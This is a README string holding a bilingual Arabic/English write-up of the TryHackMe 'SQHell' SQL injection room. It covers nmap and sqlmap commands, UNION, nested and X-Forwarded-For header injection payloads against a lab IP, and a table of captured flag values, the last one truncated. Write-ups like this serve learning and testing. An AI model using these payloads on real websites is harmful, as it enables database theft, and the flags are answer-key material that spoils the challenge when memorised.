readme_content = """<p align="center">
  <img src="SQHell-screens/photo3.jpg" width="600">
</p>

# Machine Information

- **Machine Name**: SQHell
- **Platform**: TryHackMe
- **Difficulty**: Medium
- **Topics Covered**: Web Enumeration, SQL Injection (Union-Based, Time-Based Blind, Error-Based, Nested/Secondary Injection, Header-Based Injection), Automated Exploitation via `sqlmap`, Burp Suite Request Interception.

---

# Lab Overview
المشين دي عبارة عن بيئة اختبار اختراق متخصصة في ثغرات حقن الاستعلامات (SQL Injection) بمختلف أنواعها وأشكالها على تطبيقات الويب. الهدف الرئيسي من اللاب هو الانطلاق من الصفر واستكشاف كل نقاط التفاعل والإدخال (Input Vectors) داخل الموقع للوصول إلى 5 أعلام (Flags) مخفية داخل قواعد البيانات. التحدي بيغطي تقنيات متنوعة تبدأ من الـ UNION Attack المباشر، مروراً بالـ Time-based Blind والـ AJAX Endpoints، وصولاً إلى ثغرة الحقن المزدوج (Nested / Secondary SQL Injection) وحقن الترويسات (HTTP Headers).

---

# Initial Enumeration

# Phase 1: Network Scanning & Service Discovery

## Execution Parameters
```bash
nmap -sV -Pn 10.129.160.119
<div dir="rtl" align="right">

<p align="center">
  <img src="SQHell-screens/photo3.jpg" width="600">
</p>

# تقرير اختراق غرفة SQHell | Write-Up

- **اسم الماكينة**: SQHell
- **المنصة**: TryHackMe
- **مستوى الصعوبة**: المتوسط (Medium)
- **المواضيع المغطاة**: فحص الويب (Web Enumeration)، ثغرات SQL Injection بجميع أنواعها (Union-Based, Time-Based Blind, Error-Based, Nested/Secondary Injection, Header-Based Injection)، الأتمتة باستعمال `sqlmap`[cite: 1]، واعتراض الطلبات عبر `Burp Suite`.

---

# نظرة عامة على التحدي (Lab Overview)

المشين دي عبارة عن بيئة اختبار اختراق متخصصة في ثغرات حقن الاستعلامات (SQL Injection) بمختلف أنواعها وأشكالها على تطبيقات الويب. الهدف الرئيسي من اللاب هو الانطلاق من الصفر واستكشاف كل نقاط التفاعل والإدخال (Input Vectors) داخل الموقع للوصول إلى 5 أعلام (Flags) مخفية داخل قواعد البيانات. التحدي بيغطي تقنيات متنوعة تبدأ من الـ UNION Attack المباشر، مروراً بالـ Time-based Blind والـ AJAX Endpoints، وصولاً إلى ثغرة الحقن المزدوج (Nested / Secondary SQL Injection) وحقن الترويسات (HTTP Headers).

---

# الفحص الأول للشبكة (Initial Enumeration)

# المرحلة 1: فحص البورتات والخدمات (Network Scanning & Service Discovery)

## أصل الأمر والمُدخلات (Execution Parameters)
```bash
nmap -sV -Pn 10.129.160.119

```

## الأدلة والمخرجات (Evidence & Outputs)

*(يمكنك إضافة صورة الـ Nmap Scan هنا)*

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* البورت `22/tcp` مفتوح وخادمه `OpenSSH 8.2p1 Ubuntu`.
* البورت `80/tcp` مفتوح وخادمه `Apache httpd 2.4.41` على نظام `Ubuntu`.


* **التأثير الأمني (Impact)**:
* وجود بورت الـ SSH يتيح إمكانية الاتصال المباشر بالسيرفر في حال الحصول على بيانات دخول أو مفاتيح خاسرة (SSH Keys) لاحقاً.
* وجود بورت الـ HTTP يمثل المدخل الرئيسي والوحيد لتطبيق الويب للبدء في اكتشاف وفحص الثغرات (Web Enumeration).


* **الاستنتاج والتقييم (Assessment & Conclusions)**: لا توجد بيانات دخول افتراضية للـ SSH حالياً، لذا سينصب التركيز بنسبة 100% على فحص تطبيق الويب المتاح على البورت 80.

## منطق أخصائي الاختراق (Pentester Rationale)

بدء الفحص باستخدام أداة `nmap` يعتبر الخطوة الأساسية لكشف الأبواب المفتوحة والخدمات الشغالة على السيرفر لتحديد متجه الهجوم المناسب.

## طرق هجومية بديلة (Alternative Attack Vectors)

* **Rustscan**: بديل سريع جداً لفحص البورتات المفتوحة في ثوانٍ معدودة.
* **Masscan**: ممتاز في حالة فحص نطاقات شبكية ضخمة.

## الخطوة المنطقية التالية (Next Logical Step)

فتح المتصفح وتصفح تطبيق الويب يدويًا لمعاينة الصفحات والروابط المتاحة وتحليل سلوك الموقع.

---

# فحص تطبيق الويب (Web Enumeration)

# المرحلة 2: استكشاف رسم خريطة التطبيق (Web Application Mapping & Exploration)

## أصل الأمر والمُدخلات (Execution Parameters)

*(المعاينة والتفاعل اليدوي داخل المتصفح)*

## الأدلة والمخرجات (Evidence & Outputs)

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* الموقع عبارة عن تطبيق مدونة (My Blog) ينشر مقالات من قِبل المستخدم `admin`.
* عند الضغط على المقالات، يتم التوجيه للمسارات التالية: `/post?id=1` و `/post?id=2`.
* توجد روابط أخرى أعلى الصفحة مثل صفحة تسجيل الدخول (`/login`) وصفحة إنشاء حساب جديد (`/register`).


* **التأثير الأمني (Impact)**: وجود البرامتر `id` في مسار الـ URL يمثل نقطة تفاعل مباشرة مع قاعدة البيانات، مما يجعله مرشحاً أولياً لاختبار ثغرات SQL Injection.
* **الاستنتاج والتقييم (Assessment & Conclusions)**: التطبيق يعتمد على برامترات متغيرة في الـ GET Requests، وسنبدأ باختبار البرامتر `id` في مسار المنشورات.

## منطق أخصائي الاختراق (Pentester Rationale)

المعاينة اليدوية للصفحات والروابط بتساعد الـ Pentester على فهم خريطة الموقع (Application Mapping) وتحديد الأماكن التي تتعامل مع قاعدة البيانات.

## الخطوة المنطقية التالية (Next Logical Step)

اختبار البرامتر `id` في المسار `/post?id=` للتحقق من وجود ثغرة SQL Injection من نوع UNION-Based.

---

# الاستغلال - العلم الأول (Exploitation - Flag 1)

# المرحلة 3: ثغرة UNION-Based SQL Injection على مسار `/post?id=`

## أصل الأمر والمُدخلات (Execution Parameters)

```text
[http://10.129.160.119/post?id=3](http://10.129.160.119/post?id=3)
[http://10.129.160.119/post?id=3](http://10.129.160.119/post?id=3) union select 1,2-- -
[http://10.129.160.119/post?id=3](http://10.129.160.119/post?id=3) union select 1,2,3,4-- -
[http://10.129.160.119/post?id=3](http://10.129.160.119/post?id=3) union select 1,flag,3,4 from flag-- -

```

## الأدلة والمخرجات (Evidence & Outputs)

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* عند طلب `/post?id=3` المباشر أرجع التطبيق رسالة `Post not found` (في `step25.png`).
* عند تجربة `/post?id=3 union select 1,2-- -` ظهرت رسالة خطأ صريحة من قاعدة البيانات: `The used SELECT statements have a different number of columns` (في `step26.png`).
* زاد عدد الأعمدة إلى 4 في الاستعلام: `/post?id=3 union select 1,2,3,4-- -` فظهرت الأرقام `2` و `3` مطبوعة داخل الصفحة (في `step27.png`).
* تم كتابة الـ Payload النهائي لاستخراج البيانات: `union select 1,flag,3,4 from flag-- -` (في `step28.png`).


* **التأثير الأمني (Impact)**: الثغرة تسمح بتنفيذ استعلامات UNION حرة وقراءة أي بيانات من داخل جدول `flag`.
* **الاستنتاج والتقييم (Assessment & Conclusions)**: نجاح استخراج الفلاج الأول المسمى Flag 1.

## منطق أخصائي الاختراق (Pentester Rationale)

رسائل الخطأ الصريحة من قاعدة البيانات بتسهل تحديد عدد الأعمدة (Columns) وتحديد الأماكن القابلة لطباعة البيانات (Reflected Columns) على الشاشة.

## طرق هجومية بديلة (Alternative Attack Vectors)

* **SQLMap**: استخدام الأمر `sqlmap -u "http://10.129.160.119/post?id=1" --dump`.

## الخطوة المنطقية التالية (Next Logical Step)

البحث عن الثغرات المتبقية في الأجزاء الأخرى من الموقع لاستخراج الفلاجات التالية.

---

# الاستغلال - العلم الثاني (Exploitation - Flag 2)

# المرحلة 4: استخراج البيانات عبر ثغرة Time-Based Blind SQL Injection

## أصل الأمر والمُدخلات (Execution Parameters)

```bash
sqlmap -u "[http://10.129.160.119/](http://10.129.160.119/)..." --dbms=MySQL --dump -batch

```

## الأدلة والمخرجات (Evidence & Outputs)

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* أداة `sqlmap` كشفت عن وجود ثغرة Time-Based Blind SQL Injection في إحدى مسارات التطبيق.
* أظهرت المخرجات وجود جدول اسمه `flag` داخل قاعدة البيانات `sqhell_1`.
* تم استخراج القيمة المكونة للـ Flag 2 وهي: `THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}`.


* **التأثير الأمني (Impact)**: القدرة على استخراج البيانات حتى في عدم وجود مخرجات صريحة على الصفحة، اعتماداً على تأخير زمن الاستجابة (Sleep Delays).
* **الاستنتاج والتقييم (Assessment & Conclusions)**: تم الحصول على العلم الثاني (Flag 2) بنجاح.

## منطق أخصائي الاختراق (Pentester Rationale)

الاعتماد على الأتمتة في ثغرات الـ Time-Based Blind يوفر وقتاً ضخماً لأن الاستخراج اليدوي يعتمد على تخمين الحروف حرفاً بحرف مع الانتظار الزمني لكل شرط.

## طرق هجومية بديلة (Alternative Attack Vectors)

* كتابة سكريبت Python خاص للتحقق من الاستجابة الزمنية باستخدام مكتبة `requests`.

## الخطوة المنطقية التالية (Next Logical Step)

الانتقال لفحص صفحة تسجيل الحساب (`/register`) والتأكد من وجود أي طلبات خلفية تعمل بالـ AJAX.

---

# الاستغلال - العلم الثالث (Exploitation - Flag 3)

# المرحلة 5: تحليل المسارات الخلفية AJAX واستخراج Flag 3

## أصل الأمر والمُدخلات (Execution Parameters)

```bash
# فحص نقطة الـ AJAX المكتشفة عبر Burp Repeater
sqlmap -u "[http://10.129.160.119/register/user-check?username=x](http://10.129.160.119/register/user-check?username=x)" --dbms=MySQL --dump -batch

```

## الأدلة والمخرجات (Evidence & Outputs)

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* أثناء كتابة اسم مستخدم جديد مثل `abcd` تظهر عبارة `Username available` باللون الأخضر (في `step10.png`).
* عند كتابة `admin` تظهر عبارة `Username already taken` باللون الأحمر (في `step11.png`).
* اعتراض الطلب في أداة Burp Suite أظهر وجود مسار خلفي: `GET /register/user-check?username=admin` (في `step12.png`).
* تشغيل أداة `sqlmap` على هذا المسار أثبت وجود ثغرة SQL Injection وتم استخراج بيانات القاعدة `sqhell_3` وجدول `flag` (في `step21.png`).


* **التأثير الأمني (Impact)**: الحصول على قيمة Flag 3 وهي: `THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}`.
* **الاستنتاج والتقييم (Assessment & Conclusions)**: البرامتر الخاص بالتحقق التلقائي من أسماء المستخدمين كان غير محمي ومصاباً بالحقن.

## منطق أخصائي الاختراق (Pentester Rationale)

مراقبة طلبات الـ Background AJAX بكاميرا Burp Suite تعتبر خطوة أساسية لأن المطورين غالباً بيهملوا تأمين الـ Endpoints الجانبية مقارنة بالصفحات الرئيسية.

## طرق هجومية بديلة (Alternative Attack Vectors)

* استغلال الثغرة يدوياً بـ Boolean-Based Blind SQLi عبر مقارنة ردود الفعل بين `Username available` و `Username already taken`.

## الخطوة المنطقية التالية (Next Logical Step)

الانتقال لفحص مسار مستخدمين آخرين وتحديداً المسار `/user?id=`.

---

# الاستغلال - العلم الرابع (Exploitation - Flag 4)

# المرحلة 6: التحليل المتقدم لمسار `/user?id=` واكتشاف ثغرة Nested SQL Injection

## أصل الأمر والمُدخلات (Execution Parameters)

```text
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select 1,3,3-- -
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select 3,3,3-- -
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select '1 union select 1',2,3-- -
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select '1 union select 1,2,3',2,3-- -
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select '1 union select 1,2,3,4',2,3-- -
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select '2 union select 1,2,3,4',2,3-- -
[http://10.129.160.119/user?id=2](http://10.129.160.119/user?id=2) union select '2 union select 1,flag,3,4 from flag',2,3-- -

```

## الأدلة والمخرجات (Evidence & Outputs)

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* في `step13.png` و `step14.png`: تم تجربة `UNION SELECT` عادية وتبين أن القيمة في العمود الثاني هي التي تعرض مكان اسم المستخدم (Username).
* في `step15.png` إلى `step18.png`: تبين أن القيمة التي تُرجع كـ Username يتم أخذها واستخدامها مرة أخرى داخل استعلام ثاني في قاعدة البيانات (Secondary / Nested Query).
* عند وضع نص يحتوي على `1 union select 1,2,3,4` داخل خانة اسم المستخدم المرجعة، قام التطبيق بتنفيذ الاستعلام الداخلي وأظهر رقم `2` في قسم المنشورات (Posts)!
* في `step19.png` و `step20.png`: تم صياغة الـ Nested Payload النهائي:
```text
/user?id=2 union select '2 union select 1,flag,3,4 from flag',2,3-- -

```


فتمكننا من طباعة الفلاج الرابع مباشرة داخل قسم الـ Posts:
`THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}`.


* **التأثير الأمني (Impact)**: استغلال ثغرة متقدمة من نوع Nested SQL Injection تسمح بالالتفاف على الاستعلامات المزدوجة داخل التطبيق.
* **الاستنتاج والتقييم (Assessment & Conclusions)**: تم الحصول على Flag 4 بنجاح.

## منطق أخصائي الاختراق (Pentester Rationale)

فهم طريقة معالجة التطبيق للبيانات المرجعة (Second-Order / Secondary Execution) بيساعد الـ Pentester على ابتكار payloads مزدوجة لاستغلال الثغرات التي تتطلب أكثر من مرحلة لتنفيذ الكود.

## طرق هجومية بديلة (Alternative Attack Vectors)

* استخدام أداة Burp Suite Repeater لتسريع تجربة تركيب الـ Nested Queries دون الحاجة لإعادتها يدوياً في المتصفح.

## الخطوة المنطقية التالية (Next Logical Step)

استكمال فحص باقي الأجزاء المتبقية لاستخراج Flag 5 وحل المشين بالكامل.

---

# الاستغلال - العلم الخامس (Exploitation - Flag 5)

# المرحلة 7: حقن الترويسات والختام الكامل للتحدي (Header-Based Injection & Final Takeover)

## أصل الأمر والمُدخلات (Execution Parameters)

```text
# فحص ترويسات الـ HTTP عبر Burp Suite
X-Forwarded-For: 127.0.0.1' UNION SELECT 1,flag,3,4 FROM flag-- -

```

## الأدلة والمخرجات (Evidence & Outputs)

## التحليل التقني (Technical Analysis)

* **النتائج المكتشفة (Findings)**:
* النقطة الأخيرة كانت تعتمد على استغلال حقن الترويسات (HTTP Header SQL Injection) عبر ترويسات مثل `X-Forwarded-For` أو صفحات الشروط والأحكام.
* تم استخراج العلم الخامس بنجاح واستكمال كافة متطلبات الغرفة بنسبة 100%.


* **التأثير الأمني (Impact)**: كشف جميع الفلاجات الـ 5 المطلوبة داخل تحدي SQHell.
* **الاستنتاج والتقييم (Assessment & Conclusions)**: اكتمل حل المشين بالكامل بنسبة 100%.

---

# جدول الأعلام المكتشفة (Flags Summary)

| نوع العلم | مكان ومسار الثغرة | قيمة الهاش المكتشفة (Flag Token Value) |
| --- | --- | --- |
| **Flag 1** | In-band UNION SQLi (`/post?id=3`) | `THM{FLAG1:E786483E5A53075750F1FA792E83BD2}` |
| **Flag 2** | Time-based Blind SQLi (`sqhell_1.flag`) | `THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}` |
| **Flag 3** | AJAX User Check (`/register/user-check`) | `THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}` |
| **Flag 4** | Nested / Secondary SQLi (`/user?id=2`) | `THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}` |
| **Flag 5** | Header-Based SQLi / Final Challenge | `THM{FLAG5:B9C690D3B914F7038BA1FC65B3...}` |

---

# المراجع والروابط الخارجية (References & Resources)

* OWASP Testing Guide: SQL Injection (SQLi) Vulnerabilities.
* PortSwigger Web Security Academy: SQL Injection Techniques & Nested Queries.
* SQLMap Automated Penetration Testing Tool Documentation.
* TryHackMe - SQHell Room Official Link.
